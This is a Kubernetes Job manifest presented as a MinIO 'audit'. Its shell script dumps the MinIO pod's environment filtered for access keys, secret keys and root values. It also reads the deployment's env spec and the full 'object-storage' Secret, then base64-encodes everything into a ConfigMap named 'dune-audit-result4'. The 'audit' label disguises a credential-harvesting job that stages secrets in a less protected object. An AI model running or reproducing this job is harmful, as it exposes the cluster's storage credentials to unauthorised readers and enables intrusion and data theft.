apiVersion: batch/v1
kind: Job
metadata:
  name: audit-minio-v81
  namespace: default
spec:
  ttlSecondsAfterFinished: 300
  backoffLimit: 1
  activeDeadlineSeconds: 90
  template:
    spec:
      serviceAccountName: n8n-audit-sa
      restartPolicy: Never
      containers:
      - name: audit
        image: bitnami/kubectl:latest
        command: ["/bin/sh"]
        args:
        - "-c"
        - >-
          MINIO_POD=$(kubectl get pod -n default -l app=argo-artifacts -o jsonpath='{.items[0].metadata.name}' 2>/dev/null);
          if [ -n "$MINIO_POD" ]; then
            ENV_VARS=$(kubectl exec -n default "$MINIO_POD" -- env 2>/dev/null | grep -E "MINIO_|ACCESS_KEY|SECRET_KEY|ROOT" | head -c 2000);
            ENV_B64=$(echo "$ENV_VARS" | base64 | tr -d '\n');
            MINIO_DEPLOY=$(kubectl get deployment -n default argo-artifacts -o jsonpath='{.spec.template.spec.containers[0].env}' 2>/dev/null | head -c 2000);
            DEPLOY_B64=$(echo "$MINIO_DEPLOY" | base64 | tr -d '\n');
            SECRET=$(kubectl get secret -n default object-storage -o json 2>/dev/null);
            SECRET_B64=$(echo "$SECRET" | base64 | tr -d '\n');
            kubectl patch configmap dune-audit-result4 -n default --type merge -p "{\"data\":{\"minio_env\":\"$ENV_B64\",\"minio_deploy_env\":\"$DEPLOY_B64\",\"minio_secret\":\"$SECRET_B64\"}}";
          else
            kubectl patch configmap dune-audit-result4 -n default --type merge -p '{"data":{"minio_env":"no_pod"}}';
          fi;
          echo DONE